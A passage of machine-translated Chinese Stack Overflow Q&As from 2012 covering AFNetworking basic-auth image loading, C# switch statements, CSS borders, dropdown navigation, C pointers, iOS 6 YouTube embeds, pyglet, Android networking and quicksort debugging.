> 时间：2012-09-14T18:21:42.423
> 
> 标签：afnetworking

我有一个 UITableView，我试图用来自服务器的照片以及其他数据（例如照片评论）填充它。UITableView 上的表格单元格有一个用`setImageWithURL:placeHolderImage:`. 问题是只显示占位符图像。

我已经继承了 AFHTTPClient 并且我在我的服务器上使用基本身份验证。所以，我正在做这样的事情：

```
[self setAuthorizationHeaderWithUsername:@"user" password:@"pass"]; 
```

当我对服务器执行 GET 请求时，我得到了包含数据和图像路径的 JSON。在该`tableView:cellForRowAtIndexPath:`方法中，我尝试将 UIImageView 设置为`setImageWithURL:placeHolderImage:`，但下载图像的每个请求都返回 401 Authorization Required。

我假设对图像 URL 的每次调用不包括我在子类 AFHTTPClient 中拥有的基本身份验证信息。如果确实如此，有没有办法`setImageWithURL:placeHolderImage:`使用包含基本身份验证信息的子类 AFHTTPClient？还是在每次调用下载图像时我可以采取其他方法来尊重此基本身份验证？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T00:51:51.797

虽然这`setImageWithURL:placeHolderImage:`是一种超级方便的方法，但您可能必须使用一些变通方法才能使其按您想要的方式工作。由于图像下载通常不需要身份验证，这并不奇怪。您可以更改`UIImageView+AFNetworking.m`. 这样您就可以使用该`setAuthorizationHeaderWithUsername`方法来授权自己。

或者，您可以利用此处使用的底层方法`setImageWithURL:placeHolderImage:`并[创建](https://github.com/AFNetworking/AFNetworking/blob/master/AFNetworking/UIImageView%2BAFNetworking.m#L114-135)自己的类似类`AFImageRequestOperation`，您可以在其中设置适当的授权标头。如果你选择这个，一定要实现类似的缓存方法，以使一切尽可能高效。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-07-12T19:20:37.960

在 AFHTTPClient 类的构造函数中添加以下内容：

```
[self registerHTTPOperationClass:[AFImageRequestOperation class]]; 
```

接下来，实现这样的方法：

```
- (void) getImageAtPath:(NSString *)path 
{
    NSMutableURLRequest * request = [self requestWithMethod:@"GET" path:path parameters:nil] ;
    [request addValue:@"image/*" forHTTPHeaderField:@"Accept"];
    AFHTTPRequestOperation * operation =
    [self HTTPRequestOperationWithRequest:request
                              success:^(AFHTTPRequestOperation *operation, id responseObject)
    {
        [buffer setData:[operation responseData]];
        NSLog( @"Got image data with length %d" , [buffer length] ) ;        
        // todo : use image raw data to populate image view
    } failure:^(AFHTTPRequestOperation *operation, NSError *error) {
        NSLog( @"unable to get data at %@ from the server %@" , path, [error localizedDescription] ) ;
    }] ;
    [operation start];
} 
```

# ruby-on-rails - rails - 我如何在我的测试中包含视图助手？

> ID：12429947
> 
> 赞同：0
> 
> 时间：2012-09-14T18:22:14.183
> 
> 标签：ruby-on-rails, ruby, rspec, helpers

我在测试中引用了辅助项，如何包含辅助项以便它们可用于测试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T22:04:52.493

这个博客有一篇关于如何测试视图助手的优秀文章。

[http://alexjsharp.com/posts/testing-rails-view-helpers](http://alexjsharp.com/testing-rails-view-helpers/)

# c# - 带有静态字段的 switch 语句

> ID：12429949
> 
> 赞同：16
> 
> 时间：2012-09-14T18:22:35.807
> 
> 标签：c#, .net, static, switch-statement

假设我有一堆静态字段，我想在 switch 中使用它们：

```
public static string PID_1 = "12";
public static string PID_2 = "13";
public static string PID_3 = "14";

switch(pid)
{
    case PID_1:
        //Do something 1
        break;
    case PID_2:
        //Do something 2
        break;
    case PID_3:
        //Do something 3
        break;
    default:
        //Do something default
        break;
} 
```

由于 C# 不允许在 switch 中使用非常量语句。我想了解这种设计的意图是什么。我应该如何在 c# 中执行上述操作？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-09-14T18:25:17.953

看起来那些字符串值应该只是恒定的。

```
public const string PID_1 = "12";
public const string PID_2 = "13";
public const string PID_3 = "14"; 
```

如果这不是一个选项（它们实际上是在运行时更改的），那么您可以将该解决方案重构为一系列 if/else if 语句。

至于为什么 case 语句需要保持不变；通过让它们保持不变，可以对语句进行更多优化。它实际上比一系列 if/else if 语句更有效（尽管如果您没有*大量*需要很长时间的条件检查，效果并不明显）。它将生成一个等效的哈希表，其中 case 语句的值作为键。如果值可以更改，则无法使用该方法。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2019-11-20T17:32:20.220

我知道这是一个老问题，但是其他答案中没有涵盖一种不涉及更改方法的方法：

```
switch(pid)
{
   case var _ when pid == PID_1:
      //Do something 1
   break;
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-14T18:27:56.117

*... C# 不允许在 switch 中使用非常量语句...*

如果你不能使用：

```
public const string PID_1 = "12";
public const string PID_2 = "13";
public const string PID_3 = "14"; 
```

您可以使用字典:)

```
....
public static string PID_1 = "12";
public static string PID_2 = "13";
public static string PID_3 = "14";

// Define other methods and classes here

void Main()
{
   var dict = new Dictionary<string, Action>
   {
    {PID_1, ()=>Console.WriteLine("one")},
    {PID_2, ()=>Console.WriteLine("two")},
    {PID_3, ()=>Console.WriteLine("three")},
   };
   var pid = PID_1;
   dict[pid](); 
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-14T18:25:26.460

case 参数在编译时应该是常量。

尝试`const`改用：

```
public const string PID_1 = "12";
public const string PID_2 = "13";
public const string PID_3 = "14"; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-14T18:28:23.433

我假设您没有将这些变量声明为`const`. 那说：

该`switch`语句只是一堆`if / else if`语句的简写。所以如果你能**保证**, `PID_1`,`PID_2`和`PID_3`永远*不会*相等，上面的等价于：

```
if (pid == PID_1) {
    // Do something 1
}
else if (pid == PID_2) {
    // Do something 2
}
else if (pid == PID_3) {
    // Do something 3
}
else {
    // Do something default
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-14T18:31:31.210

解决此问题的规范方法（如果您的静态字段实际上不是常量）是使用`Dictionary<Something, Action>`：

```
static Dictionary<string, Action> switchReplacement = 
    new Dictionary<string, Action>() {
        { PID_1, action1 }, 
        { PID_2, action2 }, 
        { PID_3, action3 }};

// ... Where action1, action2, and action3 are static methods with no arguments

// Later, instead of switch, you simply call
switchReplacement[pid].Invoke(); 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-09-15T00:10:29.750

为什么你不使用 enum ？
枚举关键字：http:
[//msdn.microsoft.com/en-us/library/sbbt4032%28v=vs.80%29.aspx](http://msdn.microsoft.com/en-us/library/sbbt4032%28v=vs.80%29.aspx)

在您的情况下，它可以通过枚举轻松处理：

```
public enum MyPidType
{
  PID_1 = 12,
  PID_2 = 14,
  PID_3 = 18     
} 
```

# html - 为什么 Firefox 不断删除 1px 到表格单元格的边框？

> ID：12429951
> 
> 赞同：5
> 
> 时间：2012-09-14T18:22:51.667
> 
> 标签：html, css, firefox, html-table

Firefox 是否有任何理由删除我在 CSS 文件中定义的边框值 1px？

```
.aprovGriditem th
{
   border-collapse: collapse;
   border: 4px solid #BBC6E3;
   padding: 0;
} 
```

# 编辑

```
<table cellpadding="0"  cellspacing = "1" runat="server" id="tblEmployees" width="100%">
 <tr id="tr1" runat="server" class="aprovGriditem">
   <td>
        <asp:Label ID="Label1" runat="server">
   </td>
</tr>
</table> 
```

当我检查萤火虫时，我看到边框的值为**3**。当我将值设置为**3**时，我得到**2**。以及如何处理？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:47:05.340

我没有一个宏大的解释，但是在使用小提琴进行测试时，当边框折叠仅放置在表格中的一种元素类型上时，Firefox 的反应似乎与其他浏览器不同。将边框折叠移动到整个表格：

```
#tblEmployees{
   border-collapse:collapse;
}
.aprovGriditem th
{
   border: 4px solid #BBC6E3;
   padding: 0;
} 
```

# html - 选项值作为选择下拉列表中的 url

> ID：12429963
> 
> 赞同：2
> 
> 时间：2012-09-14T18:23:24.867
> 
> 标签：html

我在 320px 视口中使用以下作为导航菜单（例如 iPhone）

```
 <select>
     <option value="#">Home</option>
     <option value="#">About</option>
     <option value="#">Products and Services</option>
     <option value="#">Markets</option>
     <option value="#">Case Studies</option>
     <option value="#">Markets</option>
     <option value="#">Partners</option>
     <option value="#">Contact Us</option>
     <option value="#">Careers</option>
     <option value="#">News</option>
  </select> 
```

我想将该值设置为相应页面的链接。我该如何设置它，我已将 URL 作为值放入，但它不起作用。我什至正确地接近这个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:28:27.487

如果你使用 jQuery，你可以这样做：

```
$('select').change(function(){
    var url = $(this).val();
    window.location = url;
}); 
```

将`change`-event 添加到（每个）选择元素。当它改变时，函数运行。该函数从新选择的选项（在本例中为 url）中获取值，并将该 url 设置为窗口的新位置。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T18:32:13.343

您可以将页面的 URL 作为选项的值属性。在下面的示例中，我使用了指向常见网站的 URL，但您可以使用指向您网站中页面的 URL。

```
<select id="nav">
     <option value="http://www.google.com">Google</option>
     <option value="http://www.ebay.com">eBay</option>
     <option value="http://www.amazon.com">Amazon</option>
</select> 
```

如果您想转到用户在更改下拉列表中的值时选择的 URL，您可以使用 JavaScript 来实现。[首先，通过 ID](https://developer.mozilla.org/en-US/docs/DOM/document.getElementById)获取选择元素。然后，[添加一个事件侦听器，它是](https://developer.mozilla.org/en-US/docs/DOM/element.addEventListener)[值更改时](https://developer.mozilla.org/en-US/docs/Mozilla_event_reference/change)将执行的函数。在该函数[中，将用户的浏览器设置为转到该 URL](https://developer.mozilla.org/en-US/docs/DOM/window.location)。

```
document.getElementById("nav").addEventListener('change', function () {
    window.location = this.value;
}, false);​ 
```

[你可以在这个jsFiddle](http://jsfiddle.net/adamzr/LySGk/)中看到我的例子。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-14T18:28:35.537

对于模拟的小型显示器`select`导航菜单`<ul><li>`- 请参阅 twitter bootsrap 或模拟它是如何工作的。

# c - C struct进入结构指针数组编译错误

> ID：12429965
> 
> 赞同：1
> 
> 时间：2012-09-14T18:23:46.630
> 
> 标签：c, arrays, pointers, struct, malloc

我有一个链表，我正在尝试创建一个临时数组来帮助我在构建结构的其余部分时解决每个节点，然后我打算释放数组，但似乎我无法存储将结构体转换为指针数组。

这是我遇到问题的简化版本：

```
vertex *vertexIndex = NULL;
vertex *vertexHead = NULL;
vertexHead = malloc(sizeof(vertex));
vertexHead->vertexNum = 5;
vertexIndex = malloc(sizeof(vertex*));
vertexIndex[0] = vertexHead;            //<<<<<<<<<<<  Error on this line
printf("%u\n", (vertexHead[0])->vertexNum); 
```

> main.c:72:19：错误：从“struct vertex *”类型分配给“vertex”类型时，类型不兼容</p>

任何帮助将不胜感激。

**编辑**

这是结构

```
struct edgeStruct {
    unsigned int edgeTo;
struct edgeStruct *nextEdge;
};
typedef struct edgeStruct edge;

struct vertexStruct {
    unsigned int vertexNum;
    edge *edgeHead; 
    struct vertexStruct *nextVertex;
};
typedef struct vertexStruct vertex; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:28:53.887

`vertexIndex`应该是指向指针的指针，因为您将它用作指针数组。

```
vertex **vertexIndex = NULL; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T18:29:07.063

`vertexIndex`不是结构数组。这只是一个结构指针，这就是您收到错误的原因。

如果你想要一个数组，声明一个数组：vertex

```
vertex *vertexHead[10]; //array of 10 pointers 
```

现在，您将能够像现在一样使用它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-14T18:29:53.967

正如错误消息所说，在该行上，您正在尝试将指针的内容分配给指针，即。分配`vertexHead`which is `vertex *`to `*vertexIndex`（相当于`vertexIndex[0]`哪些不兼容。

最好发布您的定义代码，`vertex`以便人们可以建议最好做什么。

# ios - iOS 6 嵌入 youtube

> ID：12429969
> 
> 赞同：12
> 
> 时间：2012-09-14T18:24:07.253
> 
> 标签：ios, youtube, ios6

您好，我有带有 webviews 的应用程序，并且我嵌入了 youtube 视频。现在我安装了 iOS6，但它们不再工作了。

有人已经找到解决方案了吗？

我的代码：

```
- (void)viewDidLoad
{
    [scrollvideoView setScrollEnabled:YES];
    [scrollvideoView setContentSize:CGSizeMake(320,2300)];
    [scrollvideoView setPagingEnabled:NO];

    [super viewDidLoad];
    // Do any additional setup after loading the view.

    //Variabelen
    NSInteger x1 = 25;
    NSInteger x2 = 123;
    NSInteger x3 = 220;
    NSInteger sz = 75;

    //Label height rij1
    NSInteger yt1 = 45;

    /* de Videos */
    //Eerste rij
    NSInteger y1 = 0;
    [self embedYouTube:@"http://www.youtube.com/watch?v=MFARZYEGqK8" frame:CGRectMake(x1, y1, sz, sz)];
    [self embedYouTube:@"http://www.youtube.com/watch?v=cD7WHGvXqEA" frame:CGRectMake(x2, y1, sz, sz)];
    [self embedYouTube:@"http://www.youtube.com/watch?v=8onqmHPBJOo" frame:CGRectMake(x3, y1, sz, sz)];

    //Setting de labels
    UILabel *videoLabel1 = [[UILabel alloc] initWithFrame:CGRectMake(x1, yt1, sz, sz)];
    videoLabel1.text = @"Videoclip daor heb ik schijt an";
    [self.scrollvideoView addSubview:videoLabel1];
    videoLabel1.backgroundColor = [UIColor clearColor];
    videoLabel1.font = [UIFont fontWithName:@"Arial" size: 9.0];
    videoLabel1.textColor = [UIColor whiteColor];

    UILabel *videoLabel2 = [[UILabel alloc] initWithFrame:CGRectMake(x2, yt1, sz, sz)];
    videoLabel2.text = @"Videoclip goeie been verkeerde bed";
    [self.scrollvideoView addSubview:videoLabel2];
    videoLabel2.backgroundColor = [UIColor clearColor];
    videoLabel2.font = [UIFont fontWithName:@"Arial" size: 9.0];
    videoLabel2.textColor = [UIColor whiteColor];

    UILabel *videoLabel3 = [[UILabel alloc] initWithFrame:CGRectMake(x3, yt1, sz, sz)];
    videoLabel3.text = @"Wavin flag (giel beelen)";
    [self.scrollvideoView addSubview:videoLabel3];
    videoLabel3.backgroundColor = [UIColor clearColor];
    videoLabel3.font = [UIFont fontWithName:@"Arial" size: 9.0];
    videoLabel3.textColor = [UIColor whiteColor];

    //Tweede rij
    NSInteger y2 = 100;
    [self embedYouTube:@"http://www.youtube.com/watch?v=-cJz3YGRlMI" frame:CGRectMake(x1, y2, sz, sz)];
    [self embedYouTube:@"http://www.youtube.com/watch?v=ZdQRcAnPCvk" frame:CGRectMake(x2, y2, sz, sz)];
    [self embedYouTube:@"http://www.youtube.com/watch?v=KNcT5O1qk40" frame:CGRectMake(x3, y2, sz, sz)];

}

- (void)embedYouTube:(NSString *)urlString frame:(CGRect)frame {`
    /*NSString *embedHTML = @"\
    <html><head>\
    <style type=\"text/css\">\
    body {\
    background-color: transparent;\
    color: white;\
    }\
    </style>\
    </head><body style=\"margin:0\">\
    <embed id=\"yt\" src=\"%@\" type=\"application/x-shockwave-flash\" \
    width=\"%0.0f\" height=\"%0.0f\"></embed>\
    </body></html>";

    NSString *html = [NSString stringWithFormat:embedHTML, urlString, frame.size.width,`frame.size.height];
    UIWebView *videoView = [[UIWebView alloc] initWithFrame:frame];
    [videoView loadHTMLString:html baseURL:nil];
    [self.scrollvideoView addSubview:videoView];
    //[videoView release];
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-26T02:38:30.983

很好的问题和一个我刚刚注意到并正在寻找解决方案的问题。

我确实在 Safari/WebKit 部分下的 iOS 6 发行说明中找到了这句话：

> [从 iOS 6 开始， http://www.youtube.com/watch?v=](http://www.youtube.com/watch?v=oHg5SJYRHA0) oHg5SJYRHA0 形式的嵌入式 YouTube URL 将不再有效。这些 URL 用于查看 YouTube 网站上的视频，而不是用于嵌入网页。相反，此处描述了应使用的格式：[https](https://developers.google.com/youtube/player_parameters) ://developers.google.com/youtube/player_parameters 。

回到谷歌开发者网站，似乎应该使用 iframe 嵌入视频播放器，不应该做太多的工作。

希望有帮助。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-02T07:19:10.977

//来自 Qiqi 帮助我在 ios6 中播放了 youtube 视频，如下所示，它对我有用

//这是我的 youtube 网址：http://www.youtube.com/watch?v=s9KU-oOa6pA

//视频：s9KU-oOa6pA

```
 CGRect frame = CGRectMake(5,55, 310,200);
     NSString *embedHTML =[NSString stringWithFormat:@"\
                          <html><head>\
                          <style type=\"text/css\">\
                          body {\
                          background-color: transparent;\
                          color: blue;\
                          }\
                          </style>\
                          </head><body style=\"margin:0\">\
                          <iframe height=\"200\" width=\"310\"      src=\"http://www.youtube.com/embed/s9KU-oOa6pA\"></iframe>\
                          </body></html>"];
    UIWebView *videoView = [[UIWebView alloc] initWithFrame:frame];

   videoView.backgroundColor = [UIColor clearColor];
   [videoView loadHTMLString:embedHTML baseURL:nil];
    [self.view addSubview:videoView]; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-19T16:29:24.700

如果您不需要直接自动播放，那么您也许可以使用带有播放按钮的 iframe

```
 <iframe height="90" width="75" src="http://www.youtube.com/embed/VIDEOID"></iframe> 
```

，当您按下播放按钮时，全屏播放器会接管（至少对于我在 iOS 6 中的应用程序）

如果您使用较旧的 Base SDK 5.1 (5.0) 编译应用程序，即使在 iOS 6 中，任何类型的旧 YouTube 嵌入都应该仍然有效。例如：

```
 <embed src="http://www.youtube.com/watch?v=VIDEOID" type="application/x-shockwave-flash"     widht="64" height="64"></embed> 
```

# python - Pyglet - 游戏运行缓慢，对事件和东西感到困惑

> ID：12429972
> 
> 赞同：3
> 
> 时间：2012-09-14T18:24:39.350
> 
> 标签：python, events, python-3.x, pyglet

好的，我正在用 Pyglet 制作一个小游戏/原型，我对事件感到困惑。游戏运行不佳，通过分析我知道这是因为`on_draw()`每秒被调用 60 次，因为`pyglet.clock.schedule_interval()`. 我不完全知道为什么`on_draw()`目前正在使用它可以得到的所有 CPU，这很高兴知道。通过更多分析，我知道绘制 100 个 Sprites 也需要很多 CPU，比我认为它应该占用的要多（我什至不知道它应该占用 CPU 还是只占用 GPU）。

1.  默认情况下会做什么`on_draw()`，我可以避免任何无用的额外内容吗？
2.  我怎样才能`schedule_interval()`做到不触发`on_draw()`？
3.  任何有效的绘图/blitting方法？

一些代码：

```
screen = pyglet.window.Window(800, 600, vsync=False, caption="Project")

tileimage = pyglet.image.create(50, 50, pyglet.image.SolidColorImagePattern((0, 255, 0, 255)))

class tileclass(pyglet.sprite.Sprite):
    def __init__(self, x, y):
        pyglet.sprite.Sprite.__init__(self, tileimage)
        self.x = x
        self.y = y
        self.rect = pygame.Rect(self.x - self.width / 2, self.y - self.height / 2, self.width, self.height)
        self.image.anchor_x = self.width // 2
        self.image.anchor_y = self.height // 2

tiles = []

x = 25
y = 25
for i in range(100):
    tiles.append(tileclass(x, y))
    if x == 475:
        x = 25
        y+=50
    else:
        x+=50

@screen.event
def on_draw():
    screen.clear()
    for t in tiles:
        t.draw()
    fps.draw()

pyglet.clock.schedule_interval(update, 1/60) #Logic stuff 
```

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-14T20:20:21.410

尝试将您的精灵添加到批处理中并绘制它。在 pyglet 中，绘制调用的速度很慢，因为这就是 OpenGL 的工作方式。基本上，您希望尽量减少您所做的绘制次数，并尽可能将事情批处理。通过创建一个批次，然后将所有精灵添加到其中，最后只绘制批次，我在您的示例中得到了巨大的改进。

[http://pyglet.org/doc/programming_guide/displaying_images.html#sprites](http://pyglet.org/doc/programming_guide/displaying_images.html#sprites)

这与 pygame 有点不同，pygame 小图像比大图像便宜，并且您通常通过绘制更少的像素来加快游戏速度（通常只重绘自上一帧以来发生变化的屏幕部分，依此类推）。

# android - 来自 url 的 imageview

> ID：12429977
> 
> 赞同：-3
> 
> 时间：2012-09-14T18:24:59.347
> 
> 标签：android

我使用来自 url 的多种外部 imageview 方式。但不幸的是，所有的时间活动都停止了。你知道这就是为什么。我在清单文件中有互联网限制。但我无法解决。有谁可以帮助我。?

我在链接中使用这种方式。但不在我的项目中工作。 [如何在android中显示外部图像？](https://stackoverflow.com/questions/2989077/how-to-display-external-image-in-android)

```
 public class MainActivity extends Activity{
            ImageView imgView;
            EditText inputUrl;
            OnClickListener getImageBtnOnClick = new OnClickListener() {
                public void onClick(View view) {
                    Context context = view.getContext();
                    Editable ed = inputUrl.getText();
                    Drawable image = ImageOperations(context,"http://www.cssnz.org/flower.jpg" ,"image.jpg");

                    imgView = (ImageView)findViewById(R.id.i1);
                    imgView.setImageDrawable(image);
                }
            };

            public void onCreate(Bundle icicle) {
                super.onCreate(icicle);
                setContentView(R.layout.activity_main);
                inputUrl = ((EditText)findViewById(R.id.imageURL));
                inputUrl.setSingleLine();
                inputUrl.setTextSize(11);
                Button getImageButton = (Button)findViewById(R.id.getImageButton);
                getImageButton.setOnClickListener(getImageBtnOnClick);

            }   

            private Drawable ImageOperations(Context ctx, String url, String saveFilename) {
                try {
                    InputStream is = (InputStream) this.fetch(url);
                    Drawable d = Drawable.createFromStream(is, "src");
                    return d;
                } catch (MalformedURLException e) {
                    e.printStackTrace();
                    return null;
                } catch (IOException e) {
                    e.printStackTrace();
                    return null;
                }
            }

            public Object fetch(String address) throws MalformedURLException,IOException {
                URL url = new URL(address);
                Object content = url.getContent();
                return content;
            }
        }
    xml file
    <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
        xmlns:tools="http://schemas.android.com/tools"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >

        <Button
            android:id="@+id/getImageButton"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginLeft="39dp"
            android:layout_marginTop="22dp" />

        <ImageView
            android:id="@+id/i1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_marginTop="106dp"
            android:src="@drawable/ic_action_search" />

        <EditText
            android:id="@+id/imageURL"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:ems="10" >

            <requestFocus />
        </EditText>

    </LinearLayout>

    android.manifest  

    <manifest xmlns:android="http://schemas.android.com/apk/res/android"
        package="com.example.externalimageview"
        android:versionCode="1"
        android:versionName="1.0" >

        <uses-sdk
            android:minSdkVersion="8"
            android:targetSdkVersion="15" />
        <uses-permission android:name="android.permission.INTERNET"/>

        <application
            android:icon="@drawable/ic_launcher"
            android:label="@string/app_name"
            android:theme="@style/AppTheme" >
            <activity
                android:name=".MainActivity"
                android:label="@string/title_activity_main" >
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />

                    <category android:name="android.intent.category.LAUNCHER" />
                </intent-filter>
            </activity>
        </application>

    </manifest>

log cat
09-14 19:56:31.409: W/dalvikvm(1097): threadid=1: thread exiting with uncaught exception (group=0x409c01f8)
09-14 19:56:31.459: E/AndroidRuntime(1097): FATAL EXCEPTION: main
09-14 19:56:31.459: E/AndroidRuntime(1097): android.os.NetworkOnMainThreadException
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1099)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.net.InetAddress.lookupHostByName(InetAddress.java:391)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.net.InetAddress.getAllByNameImpl(InetAddress.java:242)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.net.InetAddress.getAllByName(InetAddress.java:220)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpConnection.<init>(HttpConnection.java:71)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpConnection.<init>(HttpConnection.java:50)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpConnection$Address.connect(HttpConnection.java:351)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpConnectionPool.get(HttpConnectionPool.java:86)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpConnection.connect(HttpConnection.java:128)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpEngine.openSocketConnection(HttpEngine.java:308)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpEngine.connect(HttpEngine.java:303)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:282)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:232)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at libcore.net.http.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:80)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.net.URLConnection.getContent(URLConnection.java:194)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.net.URL.getContent(URL.java:447)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at com.example.externalimageview.MainActivity.fetch(MainActivity.java:61)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at com.example.externalimageview.MainActivity.ImageOperations(MainActivity.java:47)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at com.example.externalimageview.MainActivity.access$0(MainActivity.java:45)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at com.example.externalimageview.MainActivity$1.onClick(MainActivity.java:27)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.view.View.performClick(View.java:3511)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.view.View$PerformClick.run(View.java:14105)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.os.Handler.handleCallback(Handler.java:605)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.os.Handler.dispatchMessage(Handler.java:92)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.os.Looper.loop(Looper.java:137)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at android.app.ActivityThread.main(ActivityThread.java:4424)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.lang.reflect.Method.invokeNative(Native Method)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at java.lang.reflect.Method.invoke(Method.java:511)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
09-14 19:56:31.459: E/AndroidRuntime(1097):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T06:35:23.283

你正面临着`android.os.NetworkOnMainThreadException`。新引入了此异常，以限制您的应用程序从主 UI 线程访问网络。

这样做的主要用途是避免您的应用停止响应用户交互。当从主线程访问网络时，它实际上会阻止 UI 响应，直到方法完成执行。所以为了避免这个android抛出这个异常。

因此，您可能需要做的是，使用 a`Worker Thread`或`AsyncTask`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-15T06:53:24.413

请使用异步任务下载图像，或者您可以使用下面的代码来解决这个问题，之后将下面的代码写入您的 MainActivity 文件`setContentView(R.layout.activity_main);`

```
if (android.os.Build.VERSION.SDK_INT > 9) {
    StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
    StrictMode.setThreadPolicy(policy);
} 
```

# c++ - 为什么我的快速排序程序会崩溃？

> ID：12429980
> 
> 赞同：-3
> 
> 时间：2012-09-14T18:25:09.553
> 
> 标签：c++, quicksort

下面给出的是我能想到的快速排序技术的代码。我不确定它是否正确，但按照我的逻辑，我猜它应该可以正常工作。但是，我认为我做得太过火了，因为当我尝试在 DevC++ 上运行此代码时，它会崩溃并关闭程序。并非每个程序都会发生这种情况，因此显然只有此代码存在一些问题。

```
#include<iostream.h>
#include<conio.h>

int quick(int, int);

int split(int beg, int end);

int a[7] = { 43, 6, 235, 76, 23, 65, 29 };

int main() {
    quick(0, 6);
    getch();
    return 1;
}

int quick(int beg, int end) {
    //trial for self coding

    int loc = split(beg, end);
    quick(beg, loc - 1);//first half
    quick(loc + 1, end);//second half

    //end of coding

    cout << "\nThe sorted array is :\t";
    for (int i = 0; i < 7; i++)
        cout << a[i] << "\t";
    return 0;
}

//SPLIT FUNC STARTS
int split(int beg, int end) {
    int temp, loc, left, right, count = 1;
    left = beg;
    right = end;
    loc = beg;
    while (left != right) {
        if ((count % 2) != 0) {
            while (a[loc] <= a[right]) {
                right--;
            }
            if (loc == right)
                return loc;
            if (a[loc] > a[right]) {
                temp = a[loc];
                a[loc] = a[right];
                a[right] = temp;
                loc = right;
                left++;
                count++;
                continue;
            }
        }// end of count%2 if
        else {
            while (a[left] <= a[loc])
                left++;
            if (loc == left)
                return loc;
            if (a[loc] < a[left]) {
                temp = a[loc];
                a[loc] = a[right];
                a[right] = temp;
                loc = left;
                right--;
                count++;
                continue;
            }
        }//end of else
    }// end of while
    return loc;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T18:35:37.247

使用调试标志编译程序并在调试器中运行它。大多数 IDE 都提供“调试”按钮。GCC 将允许您使用 -g 选项编译调试标志，并且您可以使用 gdb。

在这种情况下，我用`g++ -g quicksort.cpp && gdb a.out`. 曾经在旁边，我用过`run`. 这立即给了我一个“无法访问内存”。错误以行号完成。 `print <variable>`将打印变量并`quit`退出。

出于教育目的，我特别没有提供实际的错误位置信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-14T18:47:15.260

### 编译错误

我把它放在一个文件中并编译：

```
g++ -g yourcode.cpp 
```

第一个问题：

```
yourcode.cpp:1:21: fatal error: iostream.h: No such file or directory
compilation terminated. 
```

其次是：

```
yourcode.cpp: In function ‘int quick(int, int)’:
yourcode.cpp:23:5: error: ‘cout’ was not declared in this scope
yourcode.cpp:23:5: note: suggested alternative:
/usr/include/c++/4.6/iostream:62:18: note:   ‘std::cout’ 
```

